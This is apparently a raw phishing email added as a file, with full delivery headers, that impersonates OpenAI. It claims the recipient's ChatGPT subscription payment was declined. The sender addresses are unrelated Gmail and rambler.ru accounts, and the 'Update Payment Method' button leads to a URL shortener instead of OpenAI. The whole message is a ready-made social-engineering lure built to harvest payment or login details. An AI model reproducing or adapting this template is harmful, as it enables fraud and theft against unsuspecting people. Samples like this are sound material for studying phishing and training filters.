@@ -1,0 +1,151 @@
+Return-Path: <purvaratanapara48@gmail.com>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id uAePC+SzQWi6bAAAOB6+FQ
+	(envelope-from <purvaratanapara48@gmail.com>)
+	for <info@vorteksenerji.com>; Thu, 05 Jun 2025 18:12:36 +0300
+Return-path: <purvaratanapara48@gmail.com>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Thu, 05 Jun 2025 18:12:36 +0300
+Received: from mail-wm1-f65.google.com ([209.85.128.65]:59417)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <purvaratanapara48@gmail.com>)
+	id 1uNCGi-000000007GV-0czu
+	for info@vorteksenerji.com;
+	Thu, 05 Jun 2025 18:12:36 +0300
+Received: by mail-wm1-f65.google.com with SMTP id 5b1f17b1804b1-451ebd3d149so7296975e9.2
+        for <info@vorteksenerji.com>; Thu, 05 Jun 2025 08:12:16 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1749136315; x=1749741115; darn=vorteksenerji.com;
+        h=subject:to:mime-version:from:date:message-id:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=XYsz5q2YA/aP8YF2QKtLQVgsYc0BDXPYcqvnxOxMcA0=;
+        b=XXemzfbtII8avD2IGNi6dXo0QmpgC0cvhryorE0K9jRMMfgyfVWLdIZ80wDC3DEpT/
+         1RfC5oAlRuJgD6Kl4hjOJkMb8UKUBwge/rGYMYHyxFheExYAs0I7pgFZcV4AwLJsHS7N
+         DmtFOEfuAwemzAA+/QJLG0cWltJkQRUgTSv5HcHzDKboemGyeShxSMUxRKUBaukiwG+h
+         6x82+zLQaG9pRS6tPAw0ai/oUMWlBKVp2gjimX0SL1n7/uR+h6U3KwEiM+s96Ifxy2q+
+         TwThOrWOrZxEC29PAy2YRLAU9/kNA+NJkuTbZrsgWsSoNW8WCJ3TXcrAjIWxVOcB5q3i
+         t/Zg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1749136315; x=1749741115;
+        h=subject:to:mime-version:from:date:message-id:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=XYsz5q2YA/aP8YF2QKtLQVgsYc0BDXPYcqvnxOxMcA0=;
+        b=bpLm2XjIgvd8bObQKX/E0LEPxFV58+3q/US5vwsQ02xx2LxDuAX1T3azsmlLDltOiN
+         UT+BsWeb9OhBaJBRfzGx28gzWaJVc9JAT9AmVvi++dFlgSozCUg6UqyVM6IAeqo86uAJ
+         +tRUVelcYazY+AIRINEPM4H6N3tvKCzXd2joPoLRzg9uhJV9wW/vLmbiJvSC1aSEA4Mc
+         I1wkHgry5wxVn9rAPEpTsgEVCkuncPmCRrO2q8Drr7wU58boHE8tzXDUEB+iHKK9txkx
+         Mqw1pigxr+/W6kjyQxH+znfnXmlvXcvcr7e8xMmfYB3k7SG2iMiuX7/W5jTPDXf7oyxK
+         ftXg==
+X-Gm-Message-State: AOJu0YyLJL1y+LRd5vRJwbUDD8qDByOhEGbw1VWDIYIniDrmK1pVQu/y
+	ukuxyo7b98tPhVDUSSYAHmH4kSUPkZhGO3XP+Bw32rQU6Wbt4Npq+lAoh8MLHmmX3hix8u3NsR4
+	=
+X-Gm-Gg: ASbGncv4u9zU0TXZ7T0YOkyOa0oFlJWv4L5aaPOMCYym5RcrYfmDXyFAJl2d9io/Vk/
+	DUdWlQViq71ekxaBzq9qA4jP4nNCwn5M8+8e353H9RMYdOcqqVvowezaepmv6braxnBViw2Z6nj
+	C/MXnt7qt4cfiipY05WKQ8dLkcSl1ksXLyia28xVeRtLab6V2vAkcnRdAnUtpXkZxK8jfqnV0dG
+	ASynRT5KpPDM8u98ynbrruNyGeSXwzgOP+DvM7qqIUNNqW3lTpCWwOMdKIqWaxnWWwShzCHL29A
+	7XNeKdkWnzkDfSLsiZ3xJHuvlkQ15dcaNibYIpeWZonT1aff5dBxjtCpSFO8E4MmidKqdhHNMys
+	97dUj/gZmHS2YRSnX2r1Q5g==
+X-Google-Smtp-Source: AGHT+IHoHuNmMDSdekolXtBgOUqO3fUu9XxBfBUsiQEkgCGIXkspN7MU22rmFwLkc6uQCRBB6842fw==
+X-Received: by 2002:a05:600c:8116:b0:43d:db5:7af8 with SMTP id 5b1f17b1804b1-451f0b08973mr56921315e9.21.1749136315202;
+        Thu, 05 Jun 2025 08:11:55 -0700 (PDT)
+Received: from [10.132.255.180] ([79.127.215.210])
+        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-451fb220569sm21586685e9.29.2025.06.05.08.11.53
+        for <info@vorteksenerji.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 05 Jun 2025 08:11:54 -0700 (PDT)
+Message-ID: <6841b3ba.050a0220.6b963.8769@mx.google.com>
+Date: Thu, 05 Jun 2025 08:11:54 -0700 (PDT)
+From: OpenAI <purvaratanapara48@gmail.com>
+X-Google-Original-From: OpenAI <leonidlazarevsq6352@rambler.ru>
+Content-Type: multipart/mixed; boundary="===============2529065521196724321=="
+MIME-Version: 1.0
+To: info@vorteksenerji.com
+Subject: Reminder: Resolve Your ChatGPT Payment to Continue Service
+
+--===============2529065521196724321==
+Content-Type: text/html; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML lang=en><HEAD><TITLE>Payment Declined Notification</TITLE>
+<META content="text/html; charset=unicode" http-equiv=Content-Type>
+<META name=viewport content="width=device-width, initial-scale=1.0">
+<STYLE>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+        .content {
+            background-color: #f9f9f9;
+            padding: 25px;
+            border-radius: 5px;
+            border-left: 4px solid #e74c3c;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+            text-align: center;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #10a37f;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            margin-top: 15px;
+        }
+        .details {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            border: 1px solid #eee;
+        }
+    </STYLE>
+</HEAD>
+<BODY>
+<DIV class=header><IMG style="HEIGHT: 38px; WIDTH: 141px" alt="" 
+src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/OpenAI_Logo.svg/512px-OpenAI_Logo.svg.png" 
+width=504 height=139 data-imagetype="External" 
+data-olk-copy-source="MessageBody">&nbsp; 
+<H2>Subscription Payment Declined</H2></DIV>
+<DIV class=content>
+<P>Dear info@vorteksenerji.com,</P>
+<P>We attempted to process your subscription payment for ChatGPT, but 
+unfortunately, the payment was declined.</P>
+<P>This may be due to an issue with your payment method. To continue enjoying 
+uninterrupted access to ChatGPT, please update your payment information.</P>
+<P><A class=button href="https://zpr.io/mNqrDykAiFKK">Update Payment 
+Method</A></P>
+<OL>
+  <LI>Please verify your payment information is correct and up to date 
+  <LI>Ensure sufficient funds are available in your account 
+  <LI>Contact your bank if you believe this is an error </LI></OL>
+<P>If you believe this is a mistake or need further assistance, please contact 
+our support team.</P>
+<P>Sincerely,<BR>The ChatGPT Team</P></DIV>
+<DIV class=footer>
+<P>OpenAI | 3180 18th Street, San Francisco, CA 94110</P>
+<P>&#169; 2024 OpenAI. All rights reserved.</P>
+<P><SMALL>This is an automated message. Please do not reply directly to this 
+email.</SMALL></P></DIV></BODY></HTML>
+
+--===============2529065521196724321==--
